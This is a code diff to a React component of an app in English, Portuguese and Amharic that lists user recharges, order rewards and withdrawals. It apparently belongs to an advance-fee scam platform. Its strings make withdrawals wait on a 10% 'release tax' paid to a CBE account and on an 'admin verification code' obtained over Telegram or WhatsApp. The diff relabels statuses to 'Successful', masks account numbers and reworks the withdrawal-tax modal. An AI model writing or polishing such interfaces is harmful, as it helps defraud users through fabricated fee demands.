@@ -3,10 +3,10 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import React, { useState } from 'react';
+import React, { useState, useMemo } from 'react';
 import { useApp } from '../context/AppContext';
 import { Transaction } from '../types';
-import { useTranslation, formatUserPhoneId, formatPhoneNumbersInText } from '../utils/translations';
+import { useTranslation, formatUserPhoneId, formatPhoneNumbersInText, maskAccountNumber } from '../utils/translations';
 import { motion, AnimatePresence } from 'motion/react';
 import { 
   User as UserIcon, 
@@ -92,7 +92,7 @@ const customVerifyT = {
     amount: 'Amount:',
     bank: 'Bank:',
     reference: 'Reference:',
-    approved: 'Approved',
+    approved: 'Successful',
     pending: 'Pending',
     adminVerifyCode: 'Admin Verification Code',
     enterSecureCode: 'Enter the secure code obtained from the admin (via Telegram/WhatsApp) to cryptographically validate the transaction offline.',
@@ -104,9 +104,9 @@ const customVerifyT = {
     withdrawalAmount: 'Withdrawal Amount:',
     taxDue: 'Tax Due (10%):',
     accountNo: 'Account Nº:',
-    complete: 'Complete',
-    approvalPending: 'Approval Pending',
-    taxPending: 'Tax Pending',
+    complete: 'Successful',
+    approvalPending: 'Pending Verification',
+    taxPending: 'Pending Withdrawal',
     taxPaymentRequired: '⚠️ Tax Payment Required',
     taxDesc: (amountStr: string) => `According to regulatory guidelines, a 10% release tax (${amountStr}) must be paid before releasing the transfer.`,
     payTo: 'Pay Release Tax To (CBE)',
@@ -144,9 +144,9 @@ const customVerifyT = {
     withdrawalAmount: 'Valor da Retirada:',
     taxDue: 'Imposto (10%):',
     accountNo: 'Nº Conta:',
-    complete: 'Completo',
+    complete: 'Bem-sucedido',
     approvalPending: 'Aprovação Pendente',
-    taxPending: 'Taxa Pendente',
+    taxPending: 'Retirada Pendente',
     taxPaymentRequired: '⚠️ Pagamento de Taxa Requerido',
     taxDesc: (amountStr: string) => `De acordo com as diretrizes regulatórias, um imposto de liberação de 10% (${amountStr}) deve ser pago antes de liberar a transferência.`,
     payTo: 'Pagar Taxa de Liberação para',
@@ -172,7 +172,7 @@ const customVerifyT = {
     amount: 'የገንዘብ መጠን፦',
     bank: 'ባንክ፦',
     reference: 'ማጣቀሻ፦',
-    approved: 'የጸደቀ',
+    approved: 'የተሳካ',
     pending: 'በመጠባበቅ ላይ',
     adminVerifyCode: 'የአስተዳዳሪ ማረጋገጫ ኮድ',
     enterSecureCode: 'ግብይቱን በአስተማማኝ ሁኔታ ከመስመር ውጭ ለማረጋገጥ ከአስተዳዳሪው (በቴሌግራም/ዋትስአፕ) ያገኙትን ደህንነቱ የተጠበቀ ኮድ ያስገቡ።',
@@ -184,9 +184,9 @@ const customVerifyT = {
     withdrawalAmount: 'የሚወጣው የገንዘብ መጠን፦',
     taxDue: 'የሚከፈለው ታክስ (10%)፦',
     accountNo: 'የአካውንት ቁጥር፦',
-    complete: 'ተጠናቋል',
+    complete: 'የተሳካ',
     approvalPending: 'ማረጋገጫ በመጠባበቅ ላይ',
-    taxPending: 'ታክስ በመጠባበቅ ላይ',
+    taxPending: 'በመጠባበቅ ላይ ያለ ማውጣት',
     taxPaymentRequired: '⚠️ የታክስ ክፍያ ያስፈልጋል',
     taxDesc: (amountStr: string) => `በመመሪያው መሰረት ዝውውሩን ከመልቀቅዎ በፊት 10% የመልቀቂያ ታክስ (${amountStr}) መከፈል አለበት።`,
     payTo: 'የመልቀቂያ ታክሱን ለ (CBE) ይክፈሉ',
@@ -692,7 +692,22 @@ export const MyTab: React.FC<MyTabProps> = ({
 
   // Filter lists for current user
   const userTransactions = transactions.filter(t => t.userId === currentUser.id);
-  const userRecharges = userTransactions.filter(t => t.type === 'recharge');
+  const userRecharges = useMemo(() => {
+    const rawList = userTransactions.filter(t => t.type === 'recharge');
+    const seen = new Map<string, typeof rawList[0]>();
+    for (const tx of rawList) {
+      const key = tx.accountNumberOrRef ? `${tx.accountNumberOrRef.trim().toUpperCase()}_${tx.amount}` : tx.id;
+      const existing = seen.get(key);
+      if (!existing) {
+        seen.set(key, tx);
+      } else {
+        if (tx.status === 'approved' && existing.status !== 'approved') {
+          seen.set(key, tx);
+        }
+      }
+    }
+    return Array.from(seen.values());
+  }, [userTransactions]);
   const userWithdrawals = userTransactions.filter(t => t.type === 'withdraw');
   const userOrderRewards = userTransactions.filter(t => t.type === 'reward');
   const userBonuses = userTransactions.filter(t => 
@@ -965,7 +980,7 @@ export const MyTab: React.FC<MyTabProps> = ({
                 </span>
                 {currentUser.withdrawalAccNo ? (
                   <span className="text-[10px] text-emerald-600 font-bold block mt-0.5">
-                    {currentUser.withdrawalBank}: {currentUser.withdrawalAccNo} {currentUser.withdrawalAccName && `(${currentUser.withdrawalAccName})`}
+                    {currentUser.withdrawalBank}: {maskAccountNumber(currentUser.withdrawalAccNo)} {currentUser.withdrawalAccName && `(${currentUser.withdrawalAccName})`}
                   </span>
                 ) : (
                   <span className="text-[10px] text-slate-400 font-bold block mt-0.5">
@@ -1107,6 +1122,12 @@ export const MyTab: React.FC<MyTabProps> = ({
                               👉 {language === 'pt' ? 'Clique para inserir o código de verificação' : 'Click to enter verification code'}
                             </span>
                           )}
+                          {tx.status === 'approved' && (
+                            <span className="block text-[9px] text-emerald-600 font-bold flex items-center gap-1 mt-1">
+                              <CheckCircle2 size={10} className="text-emerald-600" />
+                              {language === 'am' ? 'የተሳካ' : language === 'pt' ? 'Bem-sucedido' : 'Successful'}
+                            </span>
+                          )}
                         </div>
                         <div className="text-right">
                           <span className="block text-xs font-black text-amber-800 text-right">+{formatPrice(tx.amount)}</span>
@@ -1115,7 +1136,11 @@ export const MyTab: React.FC<MyTabProps> = ({
                             tx.status === 'approved' ? 'bg-emerald-100 text-emerald-700' :
                             'bg-red-100 text-red-700'
                           }`}>
-                            {tx.status === 'pending' ? t('pendingStatus') : tx.status === 'approved' ? t('approvedStatus') : t('rejectedStatus')}
+                            {tx.status === 'pending' 
+                              ? t('pendingStatus') 
+                              : tx.status === 'approved' 
+                                ? (language === 'am' ? 'የተሳካ' : language === 'pt' ? 'BEM-SUCEDIDO' : 'SUCCESSFUL') 
+                                : t('rejectedStatus')}
                           </span>
                         </div>
                       </div>
@@ -1129,49 +1154,38 @@ export const MyTab: React.FC<MyTabProps> = ({
                     <div className="text-center py-12 text-xs text-slate-400 font-bold">{t('noWithdrawalsFound')}</div>
                   ) : (
                     userWithdrawals.map(tx => {
-                      const isClickable = tx.status === 'pending' || tx.status === 'tax_submitted';
                       return (
                         <div 
                           key={tx.id} 
                           onClick={() => {
-                            if (isClickable) {
-                              setSelectedPendingWithdrawal(tx);
-                              setWithdrawalTaxRefInput(tx.taxRef || '');
-                              setWithdrawalTaxScreenshot(tx.taxScreenshot || null);
-                              setWithdrawalVerificationCode('');
-                              setWithdrawalTaxError('');
-                              setWithdrawalTaxSuccess('');
-                            }
+                            setSelectedPendingWithdrawal(tx);
+                            setWithdrawalTaxRefInput(tx.taxRef || '');
+                            setWithdrawalTaxScreenshot(tx.taxScreenshot || null);
+                            setWithdrawalVerificationCode('');
+                            setWithdrawalTaxError('');
+                            setWithdrawalTaxSuccess('');
                           }}
-                          className={`bg-white border p-4 rounded-2xl shadow-sm flex justify-between items-center transition-all ${
-                            isClickable 
-                              ? 'border-amber-200/80 hover:border-amber-300 cursor-pointer hover:shadow active:scale-[0.99] bg-gradient-to-r from-white to-amber-50/20' 
-                              : 'border-slate-100'
-                          }`}
+                          className="bg-white border border-slate-200/80 hover:border-amber-300 p-4 rounded-2xl shadow-xs hover:shadow-md cursor-pointer transition-all active:scale-[0.99] flex justify-between items-center"
                         >
                           <div className="space-y-1">
                             <span className="block text-xs font-black text-slate-800">{tx.bankName}</span>
-                            <span className="block text-[10px] text-slate-400 font-medium">{t('accountNumber')}: {tx.accountNumberOrRef}</span>
+                            <span className="block text-[10px] text-slate-400 font-medium">{t('accountNumber')}: {maskAccountNumber(tx.accountNumberOrRef)}</span>
                             <span className="block text-[9px] text-slate-400 flex items-center gap-0.5">
                               <Clock size={8} /> {new Date(tx.createdAt).toLocaleString()}
                             </span>
-                            {isClickable && (
-                              <span className="block text-[9px] text-amber-600 font-bold animate-pulse mt-1">
-                                🔔 {tx.status === 'pending' ? (language === 'pt' ? 'Pagar taxa de 10% para liberar' : 'Pay 10% tax to release') : (language === 'pt' ? 'Inserir código de verificação' : 'Click to enter verification code')}
-                              </span>
-                            )}
                           </div>
                           <div className="text-right">
                             <span className="block text-xs font-black text-red-500">-{formatPrice(tx.amount)}</span>
-                            <span className={`inline-block text-[8px] font-black uppercase px-2 py-0.5 rounded-full mt-1.5 ${
+                            <span className={`inline-block text-[8px] font-black uppercase px-2.5 py-0.5 rounded-full mt-1.5 ${
                               tx.status === 'pending' ? 'bg-amber-100 text-amber-700' :
                               tx.status === 'tax_submitted' ? 'bg-blue-100 text-blue-700' :
                               tx.status === 'approved' ? 'bg-emerald-100 text-emerald-700' :
                               'bg-red-100 text-red-700'
                             }`}>
-                              {tx.status === 'pending' ? (language === 'pt' ? 'Pendente' : 'Pending Tax') : 
-                               tx.status === 'tax_submitted' ? (language === 'pt' ? 'Aprovação Pendente' : 'Approval Pending') :
-                               tx.status === 'approved' ? t('approvedStatus') : t('rejectedStatus')}
+                              {tx.status === 'pending' ? (language === 'am' ? 'በመጠባበቅ ላይ ያለ ማውጣት' : language === 'pt' ? 'Retirada Pendente' : 'Pending Withdrawal') : 
+                               tx.status === 'tax_submitted' ? (language === 'am' ? 'ማረጋገጫ በመጠባበቅ ላይ' : language === 'pt' ? 'Aprovação Pendente' : 'Pending Verification') :
+                               tx.status === 'approved' ? (language === 'am' ? 'የተሳካ' : language === 'pt' ? 'Bem-sucedido' : 'Successful') : 
+                               t('rejectedStatus')}
                             </span>
                           </div>
                         </div>
@@ -1224,7 +1238,22 @@ export const MyTab: React.FC<MyTabProps> = ({
                     userTransactions.map(tx => {
                       const isAddition = tx.type === 'recharge' || tx.type === 'reward' || tx.type === 'welcome_bonus';
                       return (
-                        <div key={tx.id} className="bg-white border border-slate-100 rounded-2xl p-4 shadow-sm flex justify-between items-center">
+                        <div 
+                          key={tx.id} 
+                          onClick={() => {
+                            if (tx.type === 'withdraw') {
+                              setSelectedPendingWithdrawal(tx);
+                              setWithdrawalTaxRefInput(tx.taxRef || '');
+                              setWithdrawalTaxScreenshot(tx.taxScreenshot || null);
+                              setWithdrawalVerificationCode('');
+                              setWithdrawalTaxError('');
+                              setWithdrawalTaxSuccess('');
+                            }
+                          }}
+                          className={`bg-white border border-slate-100 rounded-2xl p-4 shadow-sm flex justify-between items-center ${
+                            tx.type === 'withdraw' ? 'cursor-pointer hover:border-amber-300 transition-all active:scale-[0.99]' : ''
+                          }`}
+                        >
                           <div className="space-y-1">
                             <span className="block text-xs font-black text-slate-800 capitalize">{(tx.type || '').replace('_', ' ')}</span>
                             <span className="block text-[10px] text-slate-500 font-medium leading-relaxed max-w-[200px]">{formatPhoneNumbersInText(tx.description || '')}</span>
@@ -1236,12 +1265,18 @@ export const MyTab: React.FC<MyTabProps> = ({
                             <span className={`block text-xs font-black ${isAddition ? 'text-emerald-600' : 'text-slate-800'}`}>
                               {isAddition ? '+' : '-'}{formatPrice(tx.amount)}
                             </span>
-                            <span className={`inline-block text-[8px] font-black uppercase px-2 py-0.5 rounded-full mt-1.5 ${
+                            <span className={`inline-block text-[8px] font-black uppercase px-2.5 py-0.5 rounded-full mt-1.5 ${
                               tx.status === 'pending' ? 'bg-amber-100 text-amber-700' :
+                              tx.status === 'tax_submitted' ? 'bg-blue-100 text-blue-700' :
                               tx.status === 'approved' || tx.status === 'completed' ? 'bg-emerald-100 text-emerald-700' :
                               'bg-red-100 text-red-700'
                             }`}>
-                              {tx.status === 'pending' ? t('pendingStatus') : (tx.status === 'approved' || tx.status === 'completed') ? t('approvedStatus') : t('rejectedStatus')}
+                              {tx.type === 'withdraw'
+                                ? (tx.status === 'pending' ? (language === 'am' ? 'በመጠባበቅ ላይ ያለ ማውጣት' : language === 'pt' ? 'Retirada Pendente' : 'Pending Withdrawal')
+                                  : tx.status === 'tax_submitted' ? (language === 'am' ? 'ማረጋገጫ በመጠባበቅ ላይ' : language === 'pt' ? 'Aprovação Pendente' : 'Pending Verification')
+                                  : (tx.status === 'approved' || tx.status === 'completed') ? (language === 'am' ? 'የተሳካ' : language === 'pt' ? 'Bem-sucedido' : 'Successful')
+                                  : t('rejectedStatus'))
+                                : (tx.status === 'pending' ? t('pendingStatus') : (tx.status === 'approved' || tx.status === 'completed') ? t('approvedStatus') : t('rejectedStatus'))}
                             </span>
                           </div>
                         </div>
@@ -1894,7 +1929,7 @@ export const MyTab: React.FC<MyTabProps> = ({
                       </div>
                       <div className="flex justify-between items-center text-xs">
                         <span className="text-slate-500 font-bold">{cvt.accountNo}</span>
-                        <span className="text-slate-800 font-mono font-bold select-all bg-slate-200/60 px-1.5 py-0.5 rounded text-[10px]">{currentTxInModal.accountNumberOrRef}</span>
+                        <span className="text-slate-800 font-mono font-bold select-all bg-slate-200/60 px-1.5 py-0.5 rounded text-[10px]">{maskAccountNumber(currentTxInModal.accountNumberOrRef)}</span>
                       </div>
                       <div className="flex justify-between items-center text-xs">
                         <span className="text-slate-500 font-bold">Status:</span>
@@ -2183,6 +2218,30 @@ export const MyTab: React.FC<MyTabProps> = ({
                           </button>
                         </div>
                       </form>
+                    )}
+
+                    {/* Step 3 / Completed State: Successful */}
+                    {currentTxInModal.status === 'approved' && (
+                      <div className="space-y-4 pt-2">
+                        <div className="bg-emerald-50 rounded-2xl p-4 border border-emerald-100 text-center space-y-2">
+                          <div className="w-12 h-12 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
+                            <CheckCircle2 size={24} className="text-emerald-600" />
+                          </div>
+                          <h4 className="text-xs font-black text-emerald-900 uppercase tracking-wider">
+                            {language === 'am' ? 'የተሳካ ማውጣት' : language === 'pt' ? 'Retirada Bem-sucedida' : 'Successful Withdrawal'}
+                          </h4>
+                          <p className="text-[10px] text-slate-500 font-medium leading-relaxed">
+                            {language === 'am' ? 'የታክስ ማረጋገጫ ተጠናቅቆ ማውጣቱ በተሳካ ሁኔታ ተፈጽሟል።' : language === 'pt' ? 'O imposto foi verificado e a retirada foi concluída com sucesso.' : 'Tax payment and verification completed. Withdrawal has been processed successfully.'}
+                          </p>
+                        </div>
+                        <button
+                          type="button"
+                          onClick={() => setSelectedPendingWithdrawal(null)}
+                          className="w-full bg-slate-900 hover:bg-slate-800 text-white font-black text-[10px] uppercase tracking-wider py-3 rounded-xl text-center cursor-pointer transition-all active:scale-[0.98]"
+                        >
+                          {cvt.close}
+                        </button>
+                      </div>
                     )}
                   </div>
                 </motion.div>
